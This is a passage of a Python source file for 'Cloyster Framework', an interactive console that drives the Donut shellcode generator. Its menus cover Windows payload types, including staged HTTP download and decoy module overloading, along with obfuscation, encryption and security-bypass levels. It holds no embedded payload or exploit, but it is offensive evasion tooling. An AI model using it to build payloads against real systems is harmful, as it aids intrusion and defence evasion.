#!/usr/bin/env python3

# Cloyster Framework - Advanced Offensive Shellcode Generator - Baseado no Donut (TheWover/Odzhan)
# Guilherme-alexander
"""
                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding those notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. We also recommend that a
      file or class name and description of purpose be included on the
      same "printed page" as the copyright notice for easier
      identification within third-party archives.

   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
"""

import os
import sys
import time
import random
import subprocess
import json
import shutil
from pathlib import Path

# READLINE COMPATIBILITY (Windows/Linux)
# ════════════════════════════════════════════════════════════════
readline = None
readline_available = False

try:
    import readline
    readline_available = True
except Exception:
    try:
        import pyreadline3 as readline
        readline_available = True
    except Exception:
        readline = None
        readline_available = False

# COLORS
# ════════════════════════════════════════════════════════════════
G = "\033[92m"
R = "\033[91m"
Y = "\033[93m"
C = "\033[96m"
B = "\033[1m"
X = "\033[0m"

# colors
BLACK = "\033[30m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
PURPLE = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"

# text style
BOLD = "\033[1m"
DIM = "\033[2m"
ITALIC = "\033[3m"
UNDERLINE = "\033[4m"
RESET = "\033[0m"

# light colors
BRIGHT_RED = "\033[91m"
BRIGHT_GREEN = "\033[92m"
BRIGHT_YELLOW = "\033[93m"
BRIGHT_BLUE = "\033[94m"
BRIGHT_PURPLE = "\033[95m"
BRIGHT_CYAN = "\033[96m"
BRIGHT_WHITE = "\033[97m"

# colors background
BG_BLACK = "\033[40m"
BG_RED = "\033[41m"
BG_GREEN = "\033[42m"
BG_YELLOW = "\033[43m"
BG_BLUE = "\033[44m"
BG_PURPLE = "\033[45m"
BG_CYAN = "\033[46m"
BG_WHITE = "\033[47m"

# light colors background
BG_BRIGHT_RED = "\033[101m"
BG_BRIGHT_GREEN = "\033[102m"
BG_BRIGHT_YELLOW = "\033[103m"
BG_BRIGHT_BLUE = "\033[104m"
BG_BRIGHT_PURPLE = "\033[105m"
BG_BRIGHT_CYAN = "\033[106m"
BG_BRIGHT_WHITE = "\033[107m"


# HEADER
# ════════════════════════════════════════════════════════════════
def header():
    os.system("cls" if os.name == "nt" else "clear")
    print(BRIGHT_BLUE)

    print("""@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%##%@@@@          
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%##%%%%##@@@@          
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@**%%%%%###*%@@@@@          
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@**#%%%%%#####+@@@@@@@@          
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%@@@@@@@@@@@@@@@@@@#*#%%%%%%#####*#@@@@@@@@@@          
@@@@@@@@@@@@@@@@@@@@@@@@#*+=+@@@%@%***++#@@@@@@@@@@@%*#%%%%#######*%@@@@@@@@@@@@          
@#@@%%%#**#@@@@@@@@@@@%@%-------=+@#*******@@@@@@@@@@**#########*%@@@@@@@@@@@@@@          
@@@#%%%%%%%%##**###%%@@#@---------*@#***##****%@@@@#*+***#####*@@@@@@@@@@@@@@@@@          
@@@@@%#%%%%%%##**+++=#@@@#+=-------+%#++*#####**#%%%#****%%%#@@@@@@@@@@@@@@@@@@@          
@@@@@@@@*####*+++++=--+#%@@@@%%*-=+=:-*%%#+#%%%%#*****+%@@@@@@@@@@@@@@@@@@@@@@@@          
@@@@@@@@@@@###++=++++*@@--=#%%%%%%%#+#+++++*##*#%%#*******@@@@@@@@@@@@@@@@@@@@@@          
@@@@@@@@@@@@@@#*##**%%#----==*%%%%%#*+#%+++++*@####*+++++**%@@@@%@@@@@@@@@@@@@@@          
@@@@@@@@@@@@@@@@@*@#--------+*--**+++==-%%==+=%@*###%%%#**+*#*++++*@@@@@@@@@@@@@          
@@@@@@@@@@@@@@@@*@#-=------+#=---+*##**++==##=%@+########+=****++++*@@@@@@@@@@@@          
@@@@@@@@@@@@@@@=%*-=----=#*--=#%%###*++=--:-#*%%+%%#*#*++*****===+@@@@@@@@@@@@@@         
@@@@@@@@@@@@@@@*+*#=----*@===*###**#**+==--*@#@+##*%%%%##******-++=#@@@@@@@@@@@@          
@@@@@@@@@@@@@@@%==%+-=-*@=++*****++++===-*@@@%@==+#*#%%%%%###################%#@          
@@@@@@@@@@@@@@@@@*%*==-@#-=*@@%=======-%@@@@@%%-===#*#%%%#####################*@          
@@@@@@@@@@@@@@@@@#@#==-%%---#@@@@===----:-=--=#+===***####*+*****##*******#%@@@@          
@@@@@@@@@@@@@@%+=@%====-+#----------:::::-**-::*#--+#*####****+*=+++**%@@@@@@@@@          
@@@@@@@@@@*++++++@*-------**-::::+%@@@@@@*=:::::-*+@#*#####****+==++*+@@@@@@@@@@          
@@@@@@@@@@*+++++=@#==-----=#*-:::::::::::::::::::#@#*##**********=++#@@@@@@@@@@@          
@@@@@@@@@@@@@@@@@*%*=+++===*#=--=-:::::::::::::-#%*#**####++****+=+@@@@@@@@@@@@@          
@@@@@@@@@@@@@@@@@@@##*+==+=*@=-======----====+*+*#+####%%%#++*=-==#@@@@@@@@@@@@@          
@@@@@@@@@@@@@@@@@@@@@+=*%#=-=**+======-----=%#++=#***#####*++=++**%@@@@@@@@@@@@@          
@@@@@@@@@@@@@@@@@@@@#**+=@%+------*===----=#*=+++%***====-=+*++*%@@@@@@@@@@@@@@@          
@@@@@@@@@@@@@@@@@@@@@@++++%#=-----=+=-----*#++#@%*####**+***%@@@@@@@@@@@@@@@@@@@          
@@@@@@@@@@@@@@@@@@@@@@@@@@#%%+++===--==::--+%@***#####*******+#@@@@@@@@@@@@@@@@@          
@@@@@@@@@@@@@@@@@@@@@@@@@@++=+#%%+--------=*@#********+*+******#+%@@@@@@@@@@@@@@          
@@@@@@@@@@@@@@@@@@@@@@@@*+++++%@@#@#=-----=*@********=@@@@@@%**#%%%@@@@@@@@@@@@@          
@@@@@@@@@@@@@@@@@@@@@@@+*++*@@@@@@@%%=---=###%+***+*@@@@@@@@@@@@%%@@@@@@@@@@@@@@          
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%**=%@@@@%#*#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@""")
    print(BRIGHT_CYAN)
    print("╔══════════════════════════════════════════════════════════════════════════════╗")
    print("║                               CLOYSTER FRAMEWORK                             ║")
    print("║                          Advanced Offensive Generator                        ║")
    print("╚══════════════════════════════════════════════════════════════════════════════╝")
    print(X)

# UTILS
# ════════════════════════════════════════════════════════════════
def clear():
    os.system("cls" if os.name == "nt" else "clear")

def slow(text, d=0.02):
    try:
        for c in text:
            sys.stdout.write(c)
            sys.stdout.flush()
            time.sleep(d)
        print()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Operation interrupted{X}")

def print_success(msg):
    print(f"{G}[+]{X} {msg}")

def print_error(msg):
    print(f"{R}[-]{X} {msg}")

def print_info(msg):
    print(f"{C}[*]{X} {msg}")

def print_warning(msg):
    print(f"{Y}[!]{X} {msg}")

def print_banner_text(text, color=C):
    print(color + B)
    print("╔" + "═" * (len(text) + 2) + "╗")
    print(f"║ {text} ║")
    print("╚" + "═" * (len(text) + 2) + "╝")
    print(X)

# PAYLOAD TYPES (x86 e x64)
# ════════════════════════════════════════════════════════════════
PAYLOAD_TYPES = {
    # x86 (32-bit)
    "1": {"name": "windows/x86/exec", "desc": "Executar EXE nativo (32-bit)", "type": "exe", "arch": "1"},
    "2": {"name": "windows/x86/dotnet", "desc": ".NET Assembly (32-bit)", "type": "dotnet", "arch": "1"},
    "3": {"name": "windows/x86/dll", "desc": "DLL nativa com função exportada (32-bit)", "type": "dll", "arch": "1"},
    "4": {"name": "windows/x86/vbs", "desc": "VBScript (32-bit)", "type": "script", "arch": "1"},
    "5": {"name": "windows/x86/js", "desc": "JScript (32-bit)", "type": "script", "arch": "1"},
    "6": {"name": "windows/x86/shellcode", "desc": "Shellcode puro raw (32-bit)", "type": "shellcode", "arch": "1"},
    "7": {"name": "windows/x86/staged", "desc": "Staged payload HTTP download (32-bit)", "type": "staged", "arch": "1"},
    "8": {"name": "windows/x86/module_overload", "desc": "Module Overloading decoy (32-bit)", "type": "overload", "arch": "1"},
    
    # x64 (64-bit)
    "9": {"name": "windows/x64/exec", "desc": "Executar EXE nativo (64-bit)", "type": "exe", "arch": "2"},
    "10": {"name": "windows/x64/dotnet", "desc": ".NET Assembly (64-bit)", "type": "dotnet", "arch": "2"},
    "11": {"name": "windows/x64/dll", "desc": "DLL nativa com função exportada (64-bit)", "type": "dll", "arch": "2"},
    "12": {"name": "windows/x64/vbs", "desc": "VBScript (64-bit)", "type": "script", "arch": "2"},
    "13": {"name": "windows/x64/js", "desc": "JScript (64-bit)", "type": "script", "arch": "2"},
    "14": {"name": "windows/x64/shellcode", "desc": "Shellcode puro raw (64-bit)", "type": "shellcode", "arch": "2"},
    "15": {"name": "windows/x64/staged", "desc": "Staged payload HTTP download (64-bit)", "type": "staged", "arch": "2"},
    "16": {"name": "windows/x64/module_overload", "desc": "Module Overloading decoy (64-bit)", "type": "overload", "arch": "2"},
    
    # Universal (x86 + x64)
    "17": {"name": "windows/universal/exec", "desc": "Executar EXE nativo (x86+x64)", "type": "exe", "arch": "3"},
    "18": {"name": "windows/universal/dotnet", "desc": ".NET Assembly (x86+x64)", "type": "dotnet", "arch": "3"},
    "19": {"name": "windows/universal/dll", "desc": "DLL nativa (x86+x64)", "type": "dll", "arch": "3"},
    "20": {"name": "windows/universal/vbs", "desc": "VBScript (x86+x64)", "type": "script", "arch": "3"},
    "21": {"name": "windows/universal/js", "desc": "JScript (x86+x64)", "type": "script", "arch": "3"},
    "22": {"name": "windows/universal/shellcode", "desc": "Shellcode puro raw (x86+x64)", "type": "shellcode", "arch": "3"},
    "23": {"name": "windows/universal/staged", "desc": "Staged payload HTTP download (x86+x64)", "type": "staged", "arch": "3"},
    "24": {"name": "windows/universal/module_overload", "desc": "Module Overloading decoy (x86+x64)", "type": "overload", "arch": "3"}
}

# OUTPUT FORMATS 
# ════════════════════════════════════════════════════════════════
OUTPUT_FORMATS = {
    "1": {"name": "binary", "ext": ".bin", "desc": "Raw binary shellcode"},
    "2": {"name": "base64", "ext": ".b64", "desc": "Base64 encoded"},
    "3": {"name": "c", "ext": ".c", "desc": "C array (unsigned char[])"},
    "4": {"name": "ruby", "ext": ".rb", "desc": "Ruby array"},
    "5": {"name": "python", "ext": ".py", "desc": "Python bytes"},
    "6": {"name": "powershell", "ext": ".ps1", "desc": "PowerShell script"},
    "7": {"name": "csharp", "ext": ".cs", "desc": "C# byte array"},
    "8": {"name": "hex", "ext": ".hex", "desc": "Hexadecimal string"},
    "9": {"name": "uuid", "ext": ".txt", "desc": "UUID format"},
    "10": {"name": "golang", "ext": ".go", "desc": "Go byte slice"},
    "11": {"name": "rust", "ext": ".rs", "desc": "Rust byte array"}
}

# ARCHITECTURES 
# ════════════════════════════════════════════════════════════════
ARCHITECTURES = {
    "1": "x86 (32-bit)",
    "2": "amd64 (64-bit)",
    "3": "both (x86 + amd64 universal)"
}

# ENTROPY LEVELS 
# ════════════════════════════════════════════════════════════════
ENTROPY_LEVELS = {
    "1": "None (no obfuscation)",
    "2": "Random names (API/function obfuscation)",
    "3": "Random names + Chaskey encryption (maximum)"
}

# COMPRESSION TYPES 
# ════════════════════════════════════════════════════════════════
COMPRESSION_TYPES = {
    "1": "None",
    "2": "aPLib",
    "3": "LZNT1",
    "4": "Xpress",
    "5": "Xpress Huffman"
}

# BYPASS LEVELS 
# ════════════════════════════════════════════════════════════════
BYPASS_LEVELS = {
    "1": "None",
    "2": "Abort on failure",
    "3": "Continue on failure (default)"
}

# EXIT BEHAVIORS 
# ════════════════════════════════════════════════════════════════
EXIT_BEHAVIORS = {
    "1": "Exit thread only",
    "2": "Exit process",
    "3": "Block execution (sleep forever)"
}

# HEADER MODES 
# ════════════════════════════════════════════════════════════════
HEADER_MODES = {
    "1": "Overwrite existing headers (default)",
    "2": "Keep all headers"
}

# CLOYSTER FRAMEWORK 
# ════════════════════════════════════════════════════════════════
class CloysterFramework:
    def __init__(self):
        self.current_prompt = "[😈] cloyster"
        self.payload_type = None
        self.config = {
            # Arquivos
            "input_file": None,
            "output_file": None,
            "decoy_file": None,
            "module_name": None,
            
            # Configurações principais
            "arch": "3",
            "entropy": "3",
            "format_type": "1",
            "compress": "1",
            "bypass": "3",
            "exit_behavior": "1",
            "header_mode": "1",
            
            # Parâmetros específicos
            "params": None,
            "method": None,
            "class_name": None,
            "appdomain": None,
            "runtime_version": None,
            "unicode_params": False,
            "run_as_thread": False,
            "continue_offset": None,
            
            # Staged payload
            "staged_url": None,
        }
        self.history = []
        self.history_file = os.path.join(os.path.expanduser("~"), ".cloyster_history")
        self._create_dirs()
        self._setup_readline()
        
    def _create_dirs(self):
        """Create necessary directories"""
        dirs = ["plugin", "configs", "payloads"]
        for d in dirs:
            os.makedirs(d, exist_ok=True)
    
    def _setup_readline(self):
        """Setup readline for command history and completion"""
        if readline_available and readline:
            try:
                readline.parse_and_bind("tab: complete")
                
                if os.path.exists(self.history_file):
                    readline.read_history_file(self.history_file)
                
                readline.set_history_length(1000)
                
                print_info("Readline enabled (history + tab completion)")
            except Exception as e:
                print_warning(f"Readline setup failed: {e}")
    
    def _save_history(self):
        """Save command history"""
        if readline_available and readline:
            try:
                readline.write_history_file(self.history_file)
            except:
                pass
    
    def _get_prompt(self):
        """Get current prompt string"""
        if self.payload_type:
            pinfo = PAYLOAD_TYPES.get(self.payload_type, {})
            arch_display = pinfo.get("arch", self.config["arch"])
            if arch_display == "1":
                arch_str = "x86"
            elif arch_display == "2":
                arch_str = "x64"
            else:
                arch_str = "uni"
            return f"{C}({arch_str}/{self.config['arch']}){X}:{G}/cloyster{X}$ "
        return f"{G}{self.current_prompt}{X}> "
    
    def _build_command(self):
        """Build donut.exe command based on current config"""
        if not self.config["input_file"]:
            print_error("INPUT_FILE not set!")
            return None
        
        if not os.path.exists(self.config["input_file"]):
            print_error(f"File not found: {self.config['input_file']}")
            return None
        
        cmd = ["donut.exe"]
        
        # Arquivo de entrada (obrigatório)
        cmd.extend(["-i", self.config["input_file"]])
        
        # Arquitetura (usa a do payload se disponível)
        arch = self.config["arch"]
        if self.payload_type and self.payload_type in PAYLOAD_TYPES:
            payload_arch = PAYLOAD_TYPES[self.payload_type].get("arch")
            if payload_arch:
                arch = payload_arch
        
        cmd.extend(["-a", arch])
        
        # Entropy
        cmd.extend(["-e", self.config["entropy"]])
        
        # Formato de saída
        cmd.extend(["-f", self.config["format_type"]])
        
        # Compressão
        if self.config["compress"] != "1":
            cmd.extend(["-z", self.config["compress"]])
        
        # Bypass
        if self.config["bypass"] != "3":
            cmd.extend(["-b", self.config["bypass"]])
        
        # Exit behavior
        if self.config["exit_behavior"] != "1":
            cmd.extend(["-x", self.config["exit_behavior"]])
        
        # Header mode
        if self.config["header_mode"] != "1":
            cmd.extend(["-k", self.config["header_mode"]])
        
        # Parâmetros de linha de comando
        if self.config["params"]:
            cmd.extend(["-p", self.config["params"]])
        
        # Função/método da DLL
        if self.config["method"]:
            cmd.extend(["-m", self.config["method"]])
        
        # Classe .NET
        if self.config["class_name"]:
            cmd.extend(["-c", self.config["class_name"]])
        
        # AppDomain para .NET
        if self.config["appdomain"]:
            cmd.extend(["-d", self.config["appdomain"]])
        
        # Runtime version
        if self.config["runtime_version"]:
            cmd.extend(["-r", self.config["runtime_version"]])
        
        # Unicode parameters
        if self.config["unicode_params"]:
            cmd.append("-w")
        
        # Run EXE as thread
        if self.config["run_as_thread"]:
            cmd.append("-t")
        
        # Continue at offset
        if self.config["continue_offset"]:
            cmd.extend(["-y", self.config["continue_offset"]])
        
        # Staged payload (HTTP)
        if self.config["staged_url"]:
            cmd.extend(["-s", self.config["staged_url"]])
            if self.config["module_name"]:
                cmd.extend(["-n", self.config["module_name"]])
        
        # Module Overloading (decoy)
        if self.config["decoy_file"]:
            cmd.extend(["-j", self.config["decoy_file"]])
        
        # Arquivo de saída
        if self.config["output_file"]:
            output_path = os.path.join("payloads", self.config["output_file"])
            cmd.extend(["-o", output_path])
        
        return cmd
    
    def show_options(self):
        """Display current configuration"""
        print(f"\n{C}{'='*70}{X}")
        print(f"{B}Cloyster Framework - Current Configuration{X}")
        print(f"{C}{'='*70}{X}")
        
        # Payload info
        print(f"\n{Y}[PAYLOAD]{X}")
        if self.payload_type and self.payload_type in PAYLOAD_TYPES:
            pinfo = PAYLOAD_TYPES[self.payload_type]
            print(f"  {'Name:':<20} {pinfo['name']}")
            print(f"  {'Description:':<20} {pinfo['desc']}")
            print(f"  {'Architecture:':<20} {ARCHITECTURES.get(pinfo.get('arch', '3'), 'Unknown')}")
        else:
            print(f"  {'Type:':<20} (not set)")
        
        # Files
        print(f"\n{Y}[FILES]{X}")
        print(f"  {'INPUT_FILE:':<20} {self.config['input_file'] or '(not set)'}")
        print(f"  {'OUTPUT_FILE:':<20} {self.config['output_file'] or '(not set)'}")
        print(f"  {'DECOY_FILE:':<20} {self.config['decoy_file'] or '(not set)'}")
        
        # Core settings
        print(f"\n{Y}[CORE SETTINGS]{X}")
        print(f"  {'ARCH:':<20} {self.config['arch']} - {ARCHITECTURES.get(self.config['arch'], 'Unknown')}")
        print(f"  {'ENTROPY:':<20} {self.config['entropy']} - {ENTROPY_LEVELS.get(self.config['entropy'], 'Unknown')}")
        print(f"  {'FORMAT:':<20} {self.config['format_type']} - {OUTPUT_FORMATS.get(self.config['format_type'], {}).get('desc', 'Unknown')}")
        print(f"  {'COMPRESS:':<20} {self.config['compress']} - {COMPRESSION_TYPES.get(self.config['compress'], 'Unknown')}")
        print(f"  {'BYPASS:':<20} {self.config['bypass']} - {BYPASS_LEVELS.get(self.config['bypass'], 'Unknown')}")
        print(f"  {'EXIT BEHAVIOR:':<20} {self.config['exit_behavior']} - {EXIT_BEHAVIORS.get(self.config['exit_behavior'], 'Unknown')}")
        print(f"  {'HEADER MODE:':<20} {self.config['header_mode']} - {HEADER_MODES.get(self.config['header_mode'], 'Unknown')}")
        
        # Optional parameters
        print(f"\n{Y}[OPTIONAL PARAMETERS]{X}")
        print(f"  {'PARAMS:':<20} {self.config['params'] or '(none)'}")
        print(f"  {'METHOD:':<20} {self.config['method'] or '(none)'}")
        print(f"  {'CLASS:':<20} {self.config['class_name'] or '(none)'}")
        print(f"  {'APPDOMAIN:':<20} {self.config['appdomain'] or '(none)'}")
        print(f"  {'RUNTIME:':<20} {self.config['runtime_version'] or '(default)'}")
        print(f"  {'UNICODE:':<20} {'Yes' if self.config['unicode_params'] else 'No'}")
        print(f"  {'RUN AS THREAD:':<20} {'Yes' if self.config['run_as_thread'] else 'No'}")
        print(f"  {'CONTINUE AT:':<20} {self.config['continue_offset'] or '(none)'}")
        
        # Staged settings
        if self.config['staged_url']:
            print(f"\n{Y}[STAGED PAYLOAD]{X}")
            print(f"  {'STAGED_URL:':<20} {self.config['staged_url']}")
            print(f"  {'MODULE_NAME:':<20} {self.config['module_name'] or '(auto)'}")
        
        print()
    
    def generate(self):
        """Generate shellcode with current configuration"""
        if not self.payload_type:
            print_error("No payload type selected! Use 'use <number>' first.")
            return False
        
        cmd = self._build_command()
        if not cmd:
            return False
        
        print_info(f"Generating shellcode...")
        print_info(f"Command: {' '.join(cmd)}")
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                print_success(f"Shellcode generated successfully!")
                if self.config["output_file"]:
                    output_path = os.path.join("payloads", self.config["output_file"])
                    print_success(f"Saved to: {output_path}")
                if result.stdout:
                    print(result.stdout)
                return True
            else:
                print_error(f"Generation failed!")
                if result.stderr:
                    print(result.stderr)
                return False
        except Exception as e:
            print_error(f"Error: {e}")
            return False
    
    # ===================== COMMANDS =====================
    
    def cmd_help(self, args):
        """Show available commands"""
        commands = {
            "help": "Show this help menu",
            "menu": "Show all framework options, payloads and examples",
            "info": "Show current module info",
            "use <1-24>": "Select payload type",
            "show options": "Show current configuration",
            "set <OPTION> <value>": "Set configuration option",
            "unset <OPTION>": "Clear configuration option",
            "generate": "Generate shellcode with current config",
            "run": "Alias for generate",
            "save config <name>": "Save current configuration",
            "load config <name>": "Load saved configuration",
            "list configs": "List saved configurations",
            "clear": "Clear screen",
            "pwd": "Show current directory",
            "ls/dir": "List files in current directory",
            "cd <dir>": "Change directory",
            "plugin <file>": "Copy file to plugin directory",
            "exit": "Exit framework",
            "history": "Show command history"
        }
        
        print(f"\n{C}{'='*60}{X}")
        print(f"{B}Cloyster Framework Commands{X}")
        print(f"{C}{'='*60}{X}")
        for cmd, desc in commands.items():
            print(f"  {G}{cmd:<20}{X} {desc}")
        print()
    
    def cmd_menu(self, args):
        """Show all available framework options"""
        print(f"\n{C}{'='*70}{X}")
        print(f"{B}CLOYSTER FRAMEWORK - MAIN MENU{X}")
        print(f"{C}{'='*70}{X}")

        # ================= PAYLOADS =================
        print(f"\n{Y}[PAYLOAD TYPES]{X}")
        
        print(f"\n  {C}[x86 - 32-bit]{X}")
        for pid, pinfo in PAYLOAD_TYPES.items():
            if pinfo.get("arch") == "1":
                print(f"    {G}{pid:>2}{X}. {pinfo['name']:<35} - {pinfo['desc']}")
        
        print(f"\n  {C}[x64 - 64-bit]{X}")
        for pid, pinfo in PAYLOAD_TYPES.items():
            if pinfo.get("arch") == "2":
                print(f"    {G}{pid:>2}{X}. {pinfo['name']:<35} - {pinfo['desc']}")
        
        print(f"\n  {C}[Universal - x86 + x64]{X}")
        for pid, pinfo in PAYLOAD_TYPES.items():
            if pinfo.get("arch") == "3":
                print(f"    {G}{pid:>2}{X}. {pinfo['name']:<35} - {pinfo['desc']}")

        # ================= FORMATS =================
        print(f"\n{Y}[OUTPUT FORMATS]{X}")
        for fid, finfo in OUTPUT_FORMATS.items():
            print(f"  {G}{fid:>2}{X}. {finfo['name']:<15} - {finfo['desc']}")

        # ================= ENTROPY =================
        print(f"\n{Y}[ENTROPY LEVELS]{X}")
        for eid, edesc in ENTROPY_LEVELS.items():
            print(f"  {G}{eid:>2}{X}. {edesc}")

        # ================= COMPRESSION =================
        print(f"\n{Y}[COMPRESSION TYPES]{X}")
        for cid, cdesc in COMPRESSION_TYPES.items():
            print(f"  {G}{cid:>2}{X}. {cdesc}")

        # ================= BYPASS =================
        print(f"\n{Y}[BYPASS LEVELS]{X}")
        for bid, bdesc in BYPASS_LEVELS.items():
            print(f"  {G}{bid:>2}{X}. {bdesc}")

        # ================= EXIT =================
        print(f"\n{Y}[EXIT BEHAVIORS]{X}")
        for xid, xdesc in EXIT_BEHAVIORS.items():
            print(f"  {G}{xid:>2}{X}. {xdesc}")

        # ================= ARCH =================
